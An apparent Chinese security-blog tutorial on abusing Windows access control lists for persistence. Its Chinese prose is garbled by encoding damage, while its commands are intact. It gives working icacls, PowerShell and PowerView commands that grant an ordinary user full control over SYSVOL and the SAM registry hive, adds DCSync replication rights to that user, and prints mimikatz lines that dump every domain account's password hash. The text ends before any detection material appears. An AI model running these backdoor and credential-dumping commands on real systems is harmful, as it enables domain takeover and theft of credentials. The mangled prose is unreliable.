I"³Y<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>Windowsç³»ç»Ÿä¸­çš„ACL(Access Control List)ï¼Œç”¨æ¥è¡¨ç¤ºç”¨æˆ·ï¼ˆç»„ï¼‰æƒé™çš„åˆ—è¡¨ã€‚</p>

<p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œç†è§£å¹¶è¿ç”¨ACLï¼Œå°¤å…¶åœ¨åé—¨åˆ©ç”¨(ææƒ)æ–¹é¢ï¼Œå¯ä¾›å‘æŒ¥çš„ç©ºé—´å¾ˆå¤§ã€‚</p>

<p>è€Œç«™åœ¨é˜²å¾¡çš„è§’åº¦ï¼Œå¦‚æœç³»ç»Ÿè¢«æ”»ç ´ï¼Œæ‰¾åˆ°å¹¶æ¸…é™¤æ”»å‡»è€…ç•™ä¸‹çš„ACLåé—¨ï¼ŒåŒæ ·éœ€è¦å¯¹ACLæœ‰ä¸€å®šçš„äº†è§£ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>ACLç›¸å…³æ¦‚å¿µ</li>
  <li>æŸ¥çœ‹ACL</li>
  <li>ACLåˆ©ç”¨(æ–‡ä»¶ã€æ³¨å†Œè¡¨å’ŒåŸŸç¯å¢ƒ)</li>
  <li>ACLæ£€æµ‹</li>
</ul>

<h2 id="0x02-aclç›¸å…³æ¦‚å¿µ">0x02 ACLç›¸å…³æ¦‚å¿µ</h2>
<hr />

<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/SecAuthZ/access-control-lists</p>

<h4 id="acl">ACLï¼š</h4>

<p>Access Control Listï¼Œç”¨æ¥è¡¨ç¤ºç”¨æˆ·ï¼ˆç»„ï¼‰æƒé™çš„åˆ—è¡¨ï¼ŒåŒ…æ‹¬DACLå’ŒSACL</p>

<h4 id="ace">ACEï¼š</h4>

<p>Access Control Entryï¼ŒACLä¸­çš„å…ƒç´ </p>

<h4 id="dacl">DACLï¼š</h4>

<p>Discretionary Access Control Listï¼Œç”¨æ¥è¡¨ç¤ºå®‰å…¨å¯¹è±¡æƒé™çš„åˆ—è¡¨</p>

<h4 id="sacl">SACLï¼š</h4>

<p>System Access Control Listï¼Œç”¨æ¥è®°å½•å¯¹å®‰å…¨å¯¹è±¡è®¿é—®çš„æ—¥å¿—</p>

<h4 id="ç›´è§‚ç†è§£">ç›´è§‚ç†è§£ï¼š</h4>

<p>Windowsè®¿é—®æ§åˆ¶æ¨¡å‹ä¸­ä¼šç”¨åˆ°ACLï¼Œæ¯”å¦‚æ–‡ä»¶ã€æ³¨å†Œè¡¨çš„æƒé™éƒ½åŒ…æ‹¬ACLï¼Œç”¨æ¥è¡¨ç¤ºå“ªäº›ç”¨æˆ·ï¼ˆç»„ï¼‰å…·æœ‰æ“ä½œæƒé™</p>

<p>ä¾‹å¦‚å¯¹æŸä¸ªæ–‡ä»¶è¿›è¡Œè®¿é—®ï¼Œç³»ç»Ÿå°†åšä»¥ä¸‹åˆ¤æ–­ï¼š</p>

<ul>
  <li>å¦‚æœæ²¡æœ‰DACLï¼Œç³»ç»Ÿå°†å…è®¸è®¿é—®</li>
  <li>å¦‚æœå­˜åœ¨DACLï¼Œä½†æ²¡æœ‰ACEï¼Œç³»ç»Ÿå°†æ‹’ç»æ‰€æœ‰è®¿é—®</li>
  <li>å¦‚æœå­˜åœ¨DACLï¼Œä¹Ÿå­˜åœ¨ACEï¼Œé‚£ä¹ˆä¼šæŒ‰ç…§æ¯ä¸ªACEæŒ‡å®šå…è®¸æˆ–æ‹’ç»</li>
</ul>

<h3 id="å®ä¾‹æ¼”ç¤º">å®ä¾‹æ¼”ç¤º</h3>

<p>å¯¹äºæ–‡ä»¶å¤¹<code class="language-plaintext highlighter-rouge">C:\Windows\SYSVOL\sysvol\test.com</code>,æŸ¥çœ‹æ–‡ä»¶å¤¹å±æ€§</p>

<p>é»˜è®¤å…±æœ‰äº”æ¡DACLï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-1.png" alt="Alt text" /></p>

<p>é€‰ä¸­ä¸€æ¡DACLï¼Œå…¶ä¸­åŒ…å«å¤šä¸ªACEï¼Œè¡¨ç¤ºå…·æœ‰çš„æƒé™ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/2-2.png" alt="Alt text" /></p>

<h2 id="0x03-æ–‡ä»¶ä¸­çš„acl">0x03 æ–‡ä»¶ä¸­çš„ACL</h2>
<hr />

<h3 id="å¸¸ç”¨å‘½ä»¤icacls">å¸¸ç”¨å‘½ä»¤(icacls)ï¼š</h3>

<h4 id="1æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„acl">1ã€æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/3-1.png" alt="Alt text" /></p>

<h4 id="2å¤‡ä»½æŒ‡å®šæ–‡ä»¶åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶çš„acl">2ã€å¤‡ä»½æŒ‡å®šæ–‡ä»¶(åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶)çš„ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /save AclFile /t
</code></pre></div></div>

<h4 id="3è¿˜åŸæŒ‡å®šæ–‡ä»¶åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶çš„acl">3ã€è¿˜åŸæŒ‡å®šæ–‡ä»¶(åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶)çš„ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\ /restore AclFile /t
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¿˜åŸæ—¶ï¼Œè·¯å¾„éœ€è¦è®¾ç½®ä¸ºä¸Šçº§ç›®å½•</p>

<h4 id="4æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™">4ã€æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶(åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /grant test1:(OI)(CI)(F) /t
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>(OI)ä»£è¡¨å¯¹è±¡ç»§æ‰¿
(CI)ä»£è¡¨å®¹å™¨ç»§æ‰¿
(F)ä»£è¡¨å®Œå…¨è®¿é—®</p>

<h4 id="5ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™">5ã€ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶(åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>icacls C:\Windows\SYSVOL\sysvol\test.com /remove test1 /t
</code></pre></div></div>

<h3 id="å¸¸ç”¨å‘½ä»¤powershell">å¸¸ç”¨å‘½ä»¤(powershell)ï¼š</h3>

<h4 id="1æŸ¥çœ‹æŒ‡å®šè·¯å¾„çš„acl">1ã€æŸ¥çœ‹æŒ‡å®šè·¯å¾„çš„ACL</h4>

<p>ä¾‹å¦‚<code class="language-plaintext highlighter-rouge">C:\Windows\SYSVOL\sysvol\test.com</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path 'C:\Windows\SYSVOL\sysvol\test.com'| Format-Table -wrap
</code></pre></div></div>

<h4 id="2æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™">2ã€æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Add-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.AddAccessRule($rule)
    Set-Acl $Path $acl
}
Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
</code></pre></div></div>

<h4 id="3ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™">3ã€ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Remove-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.RemoveAccessRule($rule)
    Set-Acl $Path $acl
}
Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
</code></pre></div></div>

<h4 id="4æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™-1">4ã€æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶(åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Add-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.AddAccessRule($rule)
    Set-Acl $Path $acl
}
Add-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
Foreach($file in $fileList)
{
    $file.fullname
    Add-ACL -Path $file.fullname
}
</code></pre></div></div>

<h4 id="5ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶çš„å®Œå…¨è®¿é—®æƒé™-1">5ã€ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šæ–‡ä»¶(åŒ…æ‹¬å½“å‰ç›®å½•åŠå…¶å­ç›®å½•ä¸­çš„æ–‡ä»¶)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Remove-ACL{
    [CmdletBinding()]           
    Param (
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Path
    )

    $acl = Get-Acl -Path $Path
    $person = [System.Security.Principal.NTAccount]"test1"
    $access = [System.Security.AccessControl.FileSystemRights]"FullControl"
    $inheritance = [System.Security.AccessControl.InheritanceFlags]"None"
    $propagation = [System.Security.AccessControl.PropagationFlags]"None"
    $type = [System.Security.AccessControl.AccessControlType]"Allow"
    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule( `
    $person,$access,$inheritance,$propagation,$type)
    $acl.RemoveAccessRule($rule)
    Set-Acl $Path $acl
}
Remove-ACL -Path 'C:\Windows\SYSVOL\sysvol\test.com'
$fileList = Get-ChildItem 'C:\Windows\SYSVOL\sysvol\test.com' -recurse
Foreach($file in $fileList)
{
    Remove-ACL -Path $file.fullname
}
</code></pre></div></div>

<h3 id="åˆ©ç”¨æ€è·¯">åˆ©ç”¨æ€è·¯ï¼š</h3>

<h4 id="1æœ¬åœ°ææƒåé—¨">1ã€æœ¬åœ°ææƒåé—¨</h4>

<p>åœ¨å–å¾—Windowsç³»ç»Ÿçš„ç®¡ç†å‘˜æƒé™åï¼Œå¯ä»¥ä¿®æ”¹ç³»ç»Ÿç›®å½•çš„ACLï¼Œæ·»åŠ æ™®é€šç”¨æˆ·çš„å®Œå…¨è®¿é—®æƒé™ï¼Œä½œä¸ºææƒåé—¨</p>

<p>åç»­å¯ä»¥é€šè¿‡dllåŠ«æŒã€æ–‡ä»¶æ›¿æ¢ç­‰å¤šç§æ–¹æ³•ä»æ™®é€šç”¨æˆ·æå‡è‡³ç®¡ç†å‘˜æƒé™</p>

<h4 id="2åŸŸç¯å¢ƒgpoçš„ä¿®æ”¹">2ã€åŸŸç¯å¢ƒGPOçš„ä¿®æ”¹</h4>

<p>ä¿®æ”¹åŸŸå†…å…±äº«æ–‡ä»¶å¤¹<code class="language-plaintext highlighter-rouge">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</code>çš„ACLï¼Œæ·»åŠ æ™®é€šç”¨æˆ·çš„å®Œå…¨è®¿é—®æƒé™</p>

<p>åç»­å¯ä»¥ä½¿ç”¨åŸŸå†…æ™®é€šç”¨æˆ·çš„æƒé™ä¿®æ”¹åŸŸç¯å¢ƒçš„GPOï¼Œä¿®æ”¹GPOçš„è®¡åˆ’ä»»åŠ¡ï¼Œå®ç°è®¡åˆ’ä»»åŠ¡çš„è¿œç¨‹æ‰§è¡Œ</p>

<p>ç›¸å…³æ–¹æ³•å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C">ã€ŠåŸŸæ¸—é€â€”â€”åˆ©ç”¨GPOä¸­çš„è®¡åˆ’ä»»åŠ¡å®ç°è¿œç¨‹æ‰§è¡Œã€‹</a></p>

<h4 id="3åŸŸå†…æ™®é€šç”¨æˆ·è¯»å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·hash">3ã€åŸŸå†…æ™®é€šç”¨æˆ·è¯»å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·hash</h4>

<p>åˆ›å»ºntds.ditçš„æ–‡ä»¶å…±äº«ï¼Œæ·»åŠ ACL</p>

<p>åç»­å¯ä»¥ä½¿ç”¨åŸŸå†…æ™®é€šç”¨æˆ·è®¿é—®åŸŸæ§åˆ¶å™¨çš„ntds.ditæ–‡ä»¶ï¼Œè¯»å–åŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</p>

<h2 id="0x04-æ³¨å†Œè¡¨ä¸­çš„acl">0x04 æ³¨å†Œè¡¨ä¸­çš„ACL</h2>
<hr />

<h3 id="å¸¸ç”¨å‘½ä»¤powershell-1">å¸¸ç”¨å‘½ä»¤(powershell)ï¼š</h3>

<h4 id="1æŸ¥çœ‹æŒ‡å®šè·¯å¾„çš„acl-1">1ã€æŸ¥çœ‹æŒ‡å®šè·¯å¾„çš„ACL</h4>

<p>ä¾‹å¦‚<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path 'HKLM:\SAM'| Format-Table -wrap
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-1.png" alt="Alt text" /></p>

<p>è·å¾—Accessé¡¹çš„å…·ä½“å†…å®¹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl -Path 'HKLM:\SAM'
$acl.Access
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-12/4-2.png" alt="Alt text" /></p>

<h4 id="2æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šè·¯å¾„åŒ…æ‹¬å½“å‰æ³¨å†Œè¡¨é¡¹åŠå…¶å­å¥çš„å®Œå…¨è®¿é—®æƒé™">2ã€æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šè·¯å¾„(åŒ…æ‹¬å½“å‰æ³¨å†Œè¡¨é¡¹åŠå…¶å­å¥)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:\SAM
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
Set-Acl HKLM:\SAM $acl
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p><code class="language-plaintext highlighter-rouge">$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"</code>è¡¨ç¤ºå…¶å­å¥ç»§æ‰¿å½“å‰æ³¨å†Œè¡¨é¡¹çš„æƒé™</p>

<p>ä¿®æ”¹æ³¨å†Œè¡¨é¡¹<code class="language-plaintext highlighter-rouge">HKLM:\SAM</code>çš„ACLéœ€è¦Administratoræƒé™</p>

<p>ä¿®æ”¹æ³¨å†Œè¡¨é¡¹<code class="language-plaintext highlighter-rouge">HKLM:\SAM\SAM</code>çš„ACLéœ€è¦Systemæƒé™</p>

<h4 id="3ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šè·¯å¾„åŒ…æ‹¬å½“å‰æ³¨å†Œè¡¨é¡¹åŠå…¶å­å¥çš„å®Œå…¨è®¿é—®æƒé™">3ã€ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šè·¯å¾„(åŒ…æ‹¬å½“å‰æ³¨å†Œè¡¨é¡¹åŠå…¶å­å¥)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$acl = Get-Acl HKLM:\SAM
$person = [System.Security.Principal.NTAccount]"test1"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.RemoveAccessRule($rule)
Set-Acl HKLM:\SAM $acl
</code></pre></div></div>

<h3 id="åˆ©ç”¨æ€è·¯-1">åˆ©ç”¨æ€è·¯ï¼š</h3>

<h4 id="1æœ¬åœ°ææƒåé—¨-1">1ã€æœ¬åœ°ææƒåé—¨</h4>

<p>ä¿®æ”¹æ³¨å†Œè¡¨é¡¹<code class="language-plaintext highlighter-rouge">HKLM:\SAM</code>å’Œ<code class="language-plaintext highlighter-rouge">HKLM:\SYSTEM</code>ï¼Œæ·»åŠ æ™®é€šç”¨æˆ·çš„å®Œå…¨è®¿é—®æƒé™</p>

<p>æ™®é€šç”¨æˆ·èƒ½å¤Ÿé€šè¿‡æ³¨å†Œè¡¨é¡¹è·å¾—æœ¬åœ°æ‰€æœ‰ç”¨æˆ·çš„hashï¼Œè¿›è€Œè·å¾—ç®¡ç†å‘˜æƒé™</p>

<h4 id="3æœ¬åœ°è‡ªå¯åŠ¨åé—¨">3ã€æœ¬åœ°è‡ªå¯åŠ¨åé—¨</h4>

<p>ä¿®æ”¹æ³¨å†Œè¡¨ä½ç½®ï¼Œæ·»åŠ å¯åŠ¨é¡¹æˆ–è€…åŠ«æŒé¡¹</p>

<h2 id="0x05-åŸŸç¯å¢ƒä¸­çš„acl">0x05 åŸŸç¯å¢ƒä¸­çš„ACL</h2>
<hr />

<p>é€šè¿‡Active Directory Service Interfaces (ADSI)å®ç°</p>

<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>

<p>https://docs.microsoft.com/en-us/windows/desktop/AD/controlling-access-to-objects-in-active-directory-domain-services</p>

<p>Powershellè°ƒç”¨ADSIçš„å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell</p>

<h3 id="å¸¸ç”¨å‘½ä»¤powershell-2">å¸¸ç”¨å‘½ä»¤(powershell)ï¼š</h3>

<p><strong>æ³¨ï¼š</strong></p>

<p>PowerViewå·²ç»å®ç°äº†è¿™éƒ¨åˆ†å†…å®¹ï¼Œæ‰€ä»¥æœ¬èŠ‚ç›´æ¥å¼•ç”¨PowerViewä¸­çš„åŠŸèƒ½</p>

<p>ä»£ç åœ°å€ï¼š</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>

<h4 id="1è·å¾—å½“å‰åŸŸå†…æ‰€æœ‰å¯¹è±¡">1ã€è·å¾—å½“å‰åŸŸå†…æ‰€æœ‰å¯¹è±¡</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObject -Domain test.com
</code></pre></div></div>

<h4 id="2è·å¾—å½“å‰åŸŸå†…æ‰€æœ‰å¯¹è±¡çš„acl">2ã€è·å¾—å½“å‰åŸŸå†…æ‰€æœ‰å¯¹è±¡çš„ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -Domain test.com
</code></pre></div></div>

<h4 id="3è·å¾—æŒ‡å®šç”¨æˆ·çš„acl">3ã€è·å¾—æŒ‡å®šç”¨æˆ·çš„ACL</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser test1
</code></pre></div></div>

<h4 id="4æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šå¯¹è±¡guidçš„å®Œå…¨è®¿é—®æƒé™">4ã€æ·»åŠ ç”¨æˆ·test1å¯¹æŒ‡å®šå¯¹è±¡(guid)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
</code></pre></div></div>

<h4 id="5ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šå¯¹è±¡guidçš„å®Œå…¨è®¿é—®æƒé™">5ã€ç§»é™¤ç”¨æˆ·test1å¯¹æŒ‡å®šå¯¹è±¡(guid)çš„å®Œå…¨è®¿é—®æƒé™</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity '483e9973-2d45-4e2f-b034-f272a26950e0' -PrincipalIdentity test1 -Rights All
</code></pre></div></div>

<h3 id="åˆ©ç”¨æ€è·¯-2">åˆ©ç”¨æ€è·¯ï¼š</h3>

<h4 id="1dcsyncåé—¨">1ã€DCSyncåé—¨</h4>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯¥æ–¹æ³•å­¦ä¹ è‡ªï¼šhttps://www.specterops.io/assets/resources/an_ace_up_the_sleeve.pdf</p>

<p>DCSyncæ˜¯mimikatzçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œèƒ½å¤Ÿæ¨¡æ‹ŸåŸŸæ§åˆ¶å™¨å¹¶ä»åŸŸæ§åˆ¶å™¨å¯¼å‡ºå¸æˆ·å¯†ç hash</p>

<p>å¦‚æœæˆ‘ä»¬åœ¨åŸŸå†…ä¸€å°ä¸»æœºä¸Šè·å¾—äº†åŸŸç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç›´æ¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hashï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
</code></pre></div></div>

<p>å¯¼å‡ºåŸŸå†…administratorå¸æˆ·çš„hashï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
</code></pre></div></div>

<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰<code class="language-plaintext highlighter-rouge">Domain Controllers</code>å’Œ<code class="language-plaintext highlighter-rouge">Enterprise Domain Admins</code>æƒé™èƒ½å¤Ÿä½¿ç”¨DCSync</p>

<p>ä½†æˆ‘ä»¬å¯ä»¥å¯¹<code class="language-plaintext highlighter-rouge">DS-Replication-GetChanges(GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</code>å’Œ<code class="language-plaintext highlighter-rouge">DS-Replication-Get-Changes-All(1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</code>æ·»åŠ ACLï¼Œè¿™æ ·å°±èƒ½å®ç°æ™®é€šç”¨æˆ·è°ƒç”¨DCSyncå¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„hash</p>

<p>å®ç°ä»£ç ï¼š</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</p>

<p>æ·»åŠ ACLçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
</code></pre></div></div>

<p>æ¥ä¸‹æ¥ï¼Œåœ¨åŸŸå†…ä¸€å°ç™»å½•äº†test1ç”¨æˆ·çš„ä¸»æœºä¸Šé¢ï¼Œå°±èƒ½ä½¿ç”¨mimikatzçš„DCSyncåŠŸèƒ½</p>

<p>åˆ é™¤ACLçš„å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync
</code></pre></div></div>

<h4 id="2gpoåé—¨">2ã€GPOåé—¨</h4>

<p>(1)æŸ¥çœ‹å½“å‰åŸŸå†…çš„GPO</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module GroupPolicy
Get-GPO -All
</code></pre></div></div>

